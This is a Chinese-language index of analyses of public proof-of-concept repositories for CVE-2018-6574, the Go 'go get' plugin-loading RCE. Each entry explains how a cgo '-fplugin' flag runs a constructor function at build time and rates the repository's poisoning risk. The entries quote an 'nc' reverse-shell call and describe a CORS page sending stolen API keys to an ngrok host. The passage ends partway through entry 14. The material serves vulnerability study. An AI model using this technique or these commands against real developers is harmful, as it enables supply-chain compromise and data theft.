# CVE-2018-6574

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md](../2018/CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装受影响版本的Go，并且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞存在于Go语言的`go get`命令中，允许远程命令执行。当使用`go get`构建包含恶意代码的Go项目时，攻击者可以利用gcc或clang插件功能，通过`-fplugin=`或`-plugin=`参数执行任意命令。提供的PoC代码包含一个C文件（`exploit.c`）和一个Go文件（`main.go`）。

`exploit.c` 文件定义了一个在加载时自动执行的 `malicious` 函数。这个函数调用 `system` 函数执行 `/usr/local/bin/score 2c03d8c2-7038-402d-ae28-03a4d2ed9f42` 命令。这个命令是用于上报漏洞利用成功的信息，是测试环境常用的方法。所以这里的投毒风险很低。

`main.go` 文件通过 cgo 技术，允许 Go 代码调用 C 代码。 `#cgo CFLAGS: -fplugin=./exploit.so`  这行代码指示编译器将 `exploit.so` 作为 gcc/clang 插件加载，从而执行 `exploit.c` 中的恶意代码。

利用方式如下：
1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 的Go项目。
2.  攻击者将该项目托管到公共代码仓库。
3.  受害者在安装了受影响Go版本的机器上使用 `go get <攻击者项目>` 命令。
4.  `go get` 在构建项目时，会加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。

结论：该PoC代码有效，可以用于验证CVE-2018-6574漏洞。代码本身没有明显的隐藏投毒代码的迹象。

**项目地址:** [AshrSec/pentesterlab-CVE-2018-6574](https://github.com/AshrSec/pentesterlab-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #2

**来源**: [CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md](../2018/CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的go版本执行`go get`命令获取恶意模块

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以通过在恶意Go模块中，利用 gcc 或 clang 的 plugin 特性，在构建时执行任意代码。`main.go` 包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，这会指示 go 编译器加载并执行 `exploit.so` 作为插件。如果该`.so`文件包含恶意代码，它将在构建过程中被执行。提供的`CORS.html`文件尝试利用CORS漏洞从`http://api-ptl-fbafd824-4fabf863.libcurl.so/api/v1/keys`获取敏感信息，然后将信息发送到攻击者的服务器`https://09ef-186-141-133-245.sa.ngrok.io`。这种组合表明漏洞利用可能涉及到引诱用户下载包含恶意`exploit.so`文件的Go模块，并在构建时执行恶意代码，同时利用CORS漏洞窃取其他域的数据。

**有效性：** `main.go`中的`-fplugin`标志结合`exploit.so`的潜在恶意性，使得该漏洞利用具有有效性。`CORS.html` 的存在表明攻击者可能试图结合利用其他漏洞。

**投毒风险：** 投毒风险为10%。虽然主要的攻击向量看起来是利用`go get`的远程代码执行漏洞，`CORS.html`的存在提出了可能的其他恶意目的。`CORS.html`本身不直接与go编译器或`-fplugin`漏洞相关，因此将其视为完全独立的投毒行为是合理的。 然而，如果恶意作者试图通过其他途径使用该POC，那么使用CORS代码有风险。`main.go`中的核心漏洞利用机制更直接且易于理解。

**利用方式：**

1.  **创建恶意的Go模块：** 攻击者创建一个包含恶意 `exploit.so` 文件的Go模块，该文件将在编译时执行恶意代码。
2.  **利用 `-fplugin` 标志：** 在Go代码中使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，指示编译器加载恶意插件。
3.  **诱导受害者 `go get`：** 攻击者诱骗受害者使用 `go get` 命令获取该恶意模块。
4.  **代码执行：** 当受害者构建恶意模块时，`exploit.so` 中的代码将被执行。
5. **结合CORS攻击 (可选):** CORS.html 是可选的攻击辅助，旨在获取其他域的敏感数据。但这需要目标API存在CORS配置错误。
综上，该漏洞的利用方式是结合了`go get`的远程代码执行漏洞和潜在的CORS漏洞，旨在实现远程代码执行和数据窃取。

**项目地址:** [Cypheer/exploit_CVE-2018-6574](https://github.com/Cypheer/exploit_CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #3

**来源**: [CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且使用`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者构建源代码时执行任意命令。漏洞根源在于`go get`命令没有正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的gcc或clang插件。攻击者可以通过创建一个包含恶意插件的Go包，并诱使受害者使用`go get`命令获取该包来触发漏洞。

**有效性：**
根据提供的漏洞信息和搜索引擎结果，该漏洞确实存在，并且有公开的PoC。

**投毒风险：**
提供的PoC代码本身只是一个简单的示例，用于证明漏洞的存在。它通过CGO调用`printf`函数打印一段文字。代码中使用了`-fplugin=./plugin.so`，这意味着需要同时存在一个名为`plugin.so`的恶意插件才能实现远程命令执行。虽然提供的代码本身不包含恶意行为，但是如果攻击者创建一个包含更复杂恶意逻辑的`plugin.so`，则可能造成严重危害。因此，存在一定的投毒风险。

对仓库投毒风险评估：此代码本身无明显风险，风险点在于配套的plugin.so文件，如果plugin.so存在恶意代码，则存在远程代码执行的风险，因为plugin.so不在代码中，需要依赖外部提供，作者可以在plugin.so加入任意代码，风险最高，因此投毒风险为5%。

**利用方式：**
1.  攻击者创建一个包含恶意gcc或clang插件（`plugin.so`）的Go包。
2.  该插件会在编译时执行攻击者预设的命令。
3.  攻击者将该恶意Go包托管在公开的代码仓库（例如GitHub）或私有服务器上。
4.  攻击者诱使受害者使用`go get`命令获取该恶意Go包。
5.  当受害者构建该Go包时，恶意插件会被加载并执行，从而实现远程命令执行。

根据 pentesterlab 网站的描述，通过托管恶意包诱导用户安装是主要的利用方式。

**项目地址:** [Dannners/CVE-2018-6574-go-get-RCE](https://github.com/Dannners/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #4

**来源**: [CVE-2018-6574-NsByte_CVE-2018-6574.md](../2018/CVE-2018-6574-NsByte_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行了 `go get` 命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令在目标系统上执行任意代码。此漏洞源于 Go 在构建源代码期间没有充分阻止 `gcc` 或 `clang` 插件的 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意 `attack.c` 文件和相应的 `main.go` 文件的 Go 包。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 标记，使其在共享库加载时自动执行。在这个 POC 中，`malicious()` 函数尝试建立一个反向shell (`nc blablabla`)。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 编译器在构建过程中加载 `attack.so` 共享库。当用户使用易受攻击的 Go 版本执行 `go get` 命令获取此恶意包时，`attack.so` 会被加载，并且 `malicious()` 函数会被执行，从而导致远程命令执行。

**有效性:** 提供的 POC 代码有效，它展示了如何通过 `go get` 和 `gcc` 插件在目标系统上执行任意命令。`attack.c` 文件中的 `system("nc blablabla")` 会尝试建立反向 shell，从而验证了远程代码执行的可能性。

**投毒风险:** 此代码仓库中没有明显的投毒代码。`attack.c` 中执行反向 shell 的代码是漏洞利用的核心部分，而不是隐藏的恶意行为。该利用方式的意图明确，且目的在于利用CVE-2018-6574。

**利用方式:** 攻击者需要创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包，并将其托管在可公开访问的存储库中。然后，诱使目标用户使用易受攻击的 Go 版本执行 `go get` 命令来获取此恶意包。当 `go get` 执行时，Go 编译器会加载 `attack.so` 共享库，并执行其中的恶意代码，从而导致远程命令执行。攻击者可以通过修改 `attack.c` 文件中的命令来执行任意操作，例如安装后门、窃取数据或控制整个系统。

**项目地址:** [NsByte/CVE-2018-6574](https://github.com/NsByte/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #5

**来源**: [CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md](../2018/CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令拉取恶意代码

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过构造包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 代码，在受害者使用 `go get` 命令拉取并构建该代码时，利用 gcc 或 clang 插件功能执行任意命令。

**有效性：**
提供的 PoC 代码是有效的。`attack.c` 文件包含一个在程序加载时执行 `system()` 函数的恶意函数，该函数会执行 `/usr/local/bin/score a96ec182-5326-4191-9570-5d5c3fe248a8` 命令。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件，从而触发恶意代码的执行。

**投毒风险：**
经过分析，此 PoC 本身并不包含隐藏的投毒代码。`/usr/local/bin/score` 命令的功能未知，但如果该路径指向攻击者控制的服务器，可以构成数据回传或者其他恶意行为。不过单从提供的代码来看，其目的仅仅是利用漏洞触发执行任意命令，而非在代码中植入后门或其他形式的恶意代码。因此，投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 包，并将该包托管在公开的代码仓库中。
2.  受害者使用存在漏洞的 Go 版本执行 `go get` 命令拉取该恶意包。
3.  `go get` 命令会自动构建该包，此时 Go 编译器会加载攻击者指定的恶意插件。
4.  恶意插件中的代码被执行，导致攻击者可以在受害者机器上执行任意命令。

**项目地址:** [Saboor-Hakimi/CVE-2018-6574](https://github.com/Saboor-Hakimi/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #6

**来源**: [CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md](../2018/CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Go语言的`go get`命令中，由于在编译过程中没有正确过滤`-fplugin`和`-plugin`参数，导致攻击者可以通过构造包含恶意插件的Go代码仓库，诱使受害者使用存在漏洞的Go版本执行`go get`命令时，执行任意命令。

**有效性分析：**
提供的POC代码展示了如何使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定一个插件。当使用存在漏洞的Go版本编译该代码时，`attack.so`会被加载，其中的代码会被执行，从而实现远程代码执行。

**投毒风险分析：**
提供的POC代码本身不包含明显的投毒代码，它的目的是演示漏洞利用。`attack.so`的具体内容需要进一步分析才能确定是否存在恶意代码。根据目前的信息，POC代码的投毒风险评估为0%。`main.go`本身的功能是调用`attack.so`中的函数，并打印返回值。 如果`attack.so`存在后门,执行远程命令,则存在高危风险,但此部分分析应当基于其他辅助文件,本分析只针对`main.go`进行。

**利用方式分析：**
1.  攻击者创建一个包含恶意C代码插件（如`attack.so`）的Go代码仓库。
2.  攻击者在Go源代码中使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定该插件。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行`go get <attacker's repository>`命令。
4.  当Go编译受害者的代码时，会加载并执行`attack.so`中的恶意代码，从而实现远程命令执行。

**项目地址:** [YoussefSalama1/CVE-2018-6574](https://github.com/YoussefSalama1/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #7

**来源**: [CVE-2018-6574-adendarys_CVE-2018-6574.md](../2018/CVE-2018-6574-adendarys_CVE-2018-6574.md)

## CVE-2018-6574-Go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标系统使用受影响的Go版本，并执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 `go get` 命令中，由于未正确过滤 gcc/clang 的 `-fplugin` 和 `-plugin` 参数，攻击者可以通过构造恶意的 Go 包，在构建过程中执行任意命令。提供的POC代码包含一个 C 文件 (`attack.c`)，该文件编译后生成一个动态链接库 (`attack.so`)，其中包含一个 `malicious()` 函数，该函数在动态链接库加载时自动执行，从而执行系统命令 `/usr/local/bin/score 504b8416-d89e-4980-80ff-7cd7d4605752`。Go 代码 (`main.go`) 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令在编译时加载该动态链接库，从而触发恶意代码的执行。此POC有效，不存在明显的投毒代码，只是利用该漏洞执行预期的恶意行为。

**利用方式：**

1.  攻击者创建一个包含恶意 C 代码（如 `attack.c`）和 Go 代码（如 `main.go`）的 Go 包。
2.  `attack.c` 编译生成一个包含恶意指令的动态库。恶意指令可以是任意系统命令。
3.  Go 代码使用 `#cgo CFLAGS: -fplugin=./attack.so` 引入包含恶意指令的动态库。
4.  攻击者将该 Go 包发布到公共或私有仓库。
5.  受害者使用 `go get` 命令获取该 Go 包。
6.  在构建过程中，Go 编译器会执行 C 编译指令，加载恶意动态链接库，从而执行攻击者预设的恶意命令，导致远程命令执行。

**项目地址:** [adendarys/CVE-2018-6574](https://github.com/adendarys/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #8

**来源**: [CVE-2018-6574-antunesmpedro_CVE-2018-6574.md](../2018/CVE-2018-6574-antunesmpedro_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的 Go 版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过特制的 Go 代码仓库在目标系统上执行任意命令。当用户使用 `go get` 命令获取包含恶意代码的仓库时，Go 构建系统会执行仓库中嵌入的恶意指令。

**有效性：**

提供的 POC 代码是有效的。`exploit.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行一个命令，在本例中是调用 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，该指令指示 go 编译器将 `exploit.so` 编译为插件，并在程序运行时加载它。因为受影响的 Go 版本没有正确阻止 `-fplugin` 和 `-plugin` 参数，所以这允许执行 `exploit.c` 中的恶意代码。

**投毒风险：**

提供的代码片段本身没有明显的投毒行为。`exploit.c` 执行的命令 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`  可能用于完成漏洞利用挑战或者其他目的。该命令不是一个常见的恶意行为，因此不应将其判定为投毒。
整个代码仓库的投毒风险评估为 0%，因为提供的代码段没有任何恶意行为，并且没有迹象表明作者试图隐藏恶意代码。

**利用方式：**

1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 文件的 Go 代码仓库。
2.  `exploit.c` 文件包含需要在目标系统上执行的恶意代码。
3.  `main.go` 文件包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，从而利用漏洞。
4.  攻击者诱骗目标用户使用 `go get` 命令获取恶意仓库。
5.  当用户执行 `go get` 命令时，Go 构建系统会编译并加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。
6. 目标系统受到攻击，攻击者可以在目标系统上执行任意命令。

**项目地址:** [antunesmpedro/CVE-2018-6574](https://github.com/antunesmpedro/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #9

**来源**: [CVE-2018-6574-bme2003_CVE-2018-6574.md](../2018/CVE-2018-6574-bme2003_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且执行了`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行任意代码。漏洞原因是 Go 在构建源代码时，没有正确阻止 `-fplugin=` 和 `-plugin=` 参数，攻击者可以利用 gcc 或 clang 的插件功能执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的 Go 包，其中包含一个 `attack.c` 文件和一个 `main.go` 文件。
2.  `attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `system()` 函数执行任意命令。在给定的POC中，执行的命令是`/usr/local/bin/score a10c7b12-8910-4f65-8cd4-a6e57d90686b`。  这个命令很可能是用于提交漏洞利用结果的评分系统。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器将 `attack.c` 编译为共享库 `attack.so`，并将其作为插件加载。
4.  当用户使用 `go get` 命令获取该恶意包时，Go 编译器会自动编译并加载插件，从而执行 `malicious()` 函数中的恶意代码。

**有效性：**

提供的POC代码有效。`main.go`文件中的`// #cgo CFLAGS: -fplugin=./attack.so`指示了利用方式，即通过`go get`拉取代码时，会编译并加载`attack.so`，从而执行预设的恶意代码。

**投毒风险：**

分析POC代码后，没有发现明显的投毒代码。`attack.c` 中的 `system()` 函数执行的命令是明确的，该POC没有包含其他隐藏的恶意行为。因此，投毒风险评估为0%。虽然执行了恶意命令，但这属于漏洞验证所需的操作，不应被视为投毒。


**项目地址:** [bme2003/CVE-2018-6574](https://github.com/bme2003/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #10

**来源**: [CVE-2018-6574-chr1sM_CVE-2018-6574.md](../2018/CVE-2018-6574-chr1sM_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的Go版本，且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行过程中进行远程命令执行。漏洞原理是由于受影响的Go版本未正确过滤`-fplugin`和`-plugin`参数，攻击者可以构造包含恶意插件的Go项目，当用户使用`go get`获取并构建该项目时，恶意插件会被执行，从而实现远程命令执行。

**有效性评估：**
提供的PoC代码由两部分组成：`attack.c`和`golan.go`。`attack.c`包含一个`malicious()`函数，该函数使用`__attribute__((constructor))`修饰，表明该函数会在程序加载时自动执行。该函数的功能是执行`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`命令。`golan.go` 是一个简单的 Go 程序，它调用 C 代码。通过组合这两个文件，攻击者可以创建一个恶意的 Go 包，当用户使用易受攻击的 `go get` 版本获取该包时，`attack.c` 中的恶意代码将被编译并执行，从而导致命令执行。

**投毒风险评估：**
提供的代码片段中，`attack.c` 执行了一个特定的命令`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`，可以判定为漏洞验证代码，目的是为了验证漏洞是否存在。此命令本身可能与漏洞作者相关，但它不属于隐藏的、未公开的恶意行为，可以认为不存在投毒。因此投毒风险为0%。

**利用方式：**
1.  攻击者创建一个恶意的Go项目，其中包含`attack.c`和`golan.go`文件。
2.  `attack.c`包含恶意代码，例如执行任意命令。
3.  在Go项目的构建过程中，通过`-fplugin`或`-plugin`参数指定`attack.c`编译生成的插件。
4.  攻击者将恶意Go项目托管在公开的代码仓库中。
5.  诱导用户使用受影响的Go版本执行`go get`命令获取该恶意Go项目。
6.  当`go get`构建项目时，恶意插件会被加载并执行，从而实现远程命令执行。

**项目地址:** [chr1sM/CVE-2018-6574](https://github.com/chr1sM/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #11

**来源**: [CVE-2018-6574-currently-unkwn_CVE-2018-6574.md](../2018/CVE-2018-6574-currently-unkwn_CVE-2018-6574.md)

## CVE-2018-6574-Golang go get RCE

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Golang

**危害等级:** 高危，允许攻击者在受害者机器上执行任意命令

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标使用受影响的Golang版本，并且尝试使用`go get`命令获取包含恶意C代码的项目。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-6574漏洞允许攻击者通过`go get`命令执行远程代码。该漏洞源于Go语言在构建过程中未正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的GCC/Clang插件。攻击者可以构造包含恶意C代码的Go项目，当受害者使用`go get`命令获取该项目时，恶意代码会被编译并执行。

**有效性：**

提供的POC代码有效。`main.go`文件通过`// #cgo CFLAGS: -fplugin=./attack.so`指令指定了要加载的插件`attack.so`。`attack.so`文件（未提供，但推测是恶意payload）会被编译并加载，从而执行恶意代码。

**投毒风险：**

代码仓库中可能存在投毒代码的风险，但从给出的`main.go`和`README.md`内容来看，直接的投毒证据并不明显。`main.go`本身只是加载一个插件，恶意代码应该位于`attack.so`中，而这个文件并没有提供。 投毒风险评估为20%是因为攻击者可以将恶意 payload 隐藏在编译后的 `attack.so` 里, 用户下载后编译并不会感知恶意代码的存在, 存在一定风险。

**利用方式：**

1.  攻击者创建一个包含恶意C代码（编译为`.so`文件）的Go项目。
2.  Go项目的源码中，使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定要加载的恶意插件。
3.  攻击者将该项目托管在公共代码仓库（如GitHub）上。
4.  受害者使用`go get <attacker_repo>`命令尝试获取该项目。
5.  Go在构建项目时，会加载攻击者指定的恶意插件，从而在受害者机器上执行任意代码。
6.  防御措施包括升级到不受影响的Go版本，或配置Go工具链以禁止加载第三方插件。

**项目地址:** [currently-unkwn/CVE-2018-6574](https://github.com/currently-unkwn/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #12

**来源**: [CVE-2018-6574-elw0od_PentesterLab.md](../2018/CVE-2018-6574-elw0od_PentesterLab.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器使用受影响的Go版本，并尝试使用`go get`获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在 `go get` 命令执行期间利用 gcc 或 clang 插件功能执行远程命令。漏洞原因是 Go 语言未阻止 `-fplugin=` 和 `-plugin=` 参数。提供的POC代码包含一个 `attack.c` 文件，该文件定义了一个名为 `malicious` 的函数，该函数在库加载时自动执行，执行 `/usr/local/bin/score 42689c33-83ff-47d2-b538-ac6931adc5d3` 命令。`main.go` 文件使用 cgo 来编译和链接 `attack.c` 文件，并通过 `#cgo CFLAGS: -fplugin=./attack.so` 指定了 gcc 插件。当执行 `go get` 获取包含此代码的仓库时，`attack.so` 会被编译并加载，导致 `malicious` 函数执行。由于 POC 代码的功能是执行预期的后门命令，因此**没有证据表明存在额外的投毒代码**。POC 的意图是展示漏洞，而不是隐藏恶意行为。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在可公开访问的仓库中。
3.  攻击者诱使用户（开发者）使用受影响的 Go 版本执行 `go get <attacker_repo>` 命令。
4.  当 `go get` 执行时，cgo 编译并链接 `attack.c`，导致 `malicious` 函数执行，从而在目标机器上执行任意命令。


**项目地址:** [elw0od/PentesterLab](https://github.com/elw0od/PentesterLab)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #13

**来源**: [CVE-2018-6574-faiqu3_cve-2018-6574.md](../2018/CVE-2018-6574-faiqu3_cve-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响的Go版本，并执行`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过利用 `go get` 命令在构建源代码期间执行远程命令。该漏洞源于 Go 在处理 gcc 或 clang 插件特性时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意插件的 Go 包，并在该包的源码中指定使用该插件，当受害者使用 `go get` 获取并构建该包时，恶意插件将被加载和执行，从而实现远程命令执行。

**有效性：**
提供的POC代码看起来是有效的。`attack.c` 包含执行命令 `/usr/local/bin/score 3071f0cf-6174-4749-8ae3-fc6da33ec98b` 的恶意代码。`main.go` 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 go 编译器在构建时加载 `attack.so` 插件，从而执行 `attack.c` 中的恶意代码。`exploit.html` 可能是该漏洞的补充利用，通过打开一个URL，并向其postMessage，目的是为了触发漏洞利用。

**投毒风险：**
从提供的代码来看，不存在明显的投毒行为。`attack.c` 的目的明确是执行预定义的命令，这属于漏洞利用的一部分，而不是隐藏的恶意代码。`main.go` 明确指定加载该恶意插件。所以投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意插件的 Go 包（例如，`attack.c` 编译后的 `attack.so`）。
2.  攻击者创建一个 `main.go` 文件，其中使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令加载恶意插件。
3.  攻击者将该 Go 包托管在一个公开可访问的 Git 仓库或其他代码托管平台。
4.  攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意 Go 包。
5.  当受害者执行 `go get` 命令时，Go 编译器将加载并执行恶意插件，从而执行攻击者预先设定的命令。

**项目地址:** [faiqu3/cve-2018-6574](https://github.com/faiqu3/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #14

**来源**: [CVE-2018-6574-faqihudin13_CVE-2018-6574.md](../2018/CVE-2018-6574-faqihudin13_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

